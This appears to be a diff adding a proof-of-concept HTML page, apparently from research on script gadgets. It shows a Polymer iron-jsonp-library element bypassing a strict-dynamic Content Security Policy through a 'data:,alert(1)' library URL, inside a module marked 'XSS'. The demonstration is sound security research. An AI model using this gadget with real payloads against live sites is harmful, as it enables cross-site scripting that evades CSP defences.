@@ -1,0 +1,77 @@
+<!DOCTYPE html><html><head><meta http-equiv=Content-Security-Policy content="
+  object-src 'none';
+  script-src 'nonce-random' 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;"
+  >
+<script nonce=random src="poc.vulcanized.js" defer=""></script><meta charset="UTF-8">
+    </head>
+  <body><div hidden="" by-vulcanize=""><!--
+@license
+Copyright (c) 2015 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+--><!--
+@license
+Copyright (c) 2014 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+--><!--
+@license
+Copyright (c) 2014 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+--><!--
+@license
+Copyright (c) 2014 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+--><!--
+@license
+Copyright (c) 2015 The Polymer Project Authors. All rights reserved.
+This code may only be used under the BSD style license found at http://polymer.github.io/LICENSE.txt
+The complete set of authors may be found at http://polymer.github.io/AUTHORS.txt
+The complete set of contributors may be found at http://polymer.github.io/CONTRIBUTORS.txt
+Code distributed by Google as part of the polymer project is also
+subject to an additional IP rights grant found at http://polymer.github.io/PATENTS.txt
+--><!--
+  Loads specified jsonp library.
+
+  Example:
+
+      <iron-jsonp-library
+        library-url="https://apis.google.com/js/plusone.js?onload=%%callback%%"
+        notify-event="api-load"
+        library-loaded="{{loaded}}"></iron-jsonp-library>
+
+  Will emit 'api-load' event when loaded, and set 'loaded' to true
+
+  Implemented by  Polymer.IronJsonpLibraryBehavior. Use it
+  to create specific library loader elements.
+
+  @demo
+-->
+</div>
+  <iframe style="width: 100%; height: 550px; border: none" src="../README.md"></iframe>
+   <dom-module id="x-foo">
+
+	XSS
+
+	<iron-jsonp-library library-url="data:,alert(1)//%%callback%%">
+	
+  /XSS
+
+  </iron-jsonp-library></dom-module>
+  
+
+</body></html>
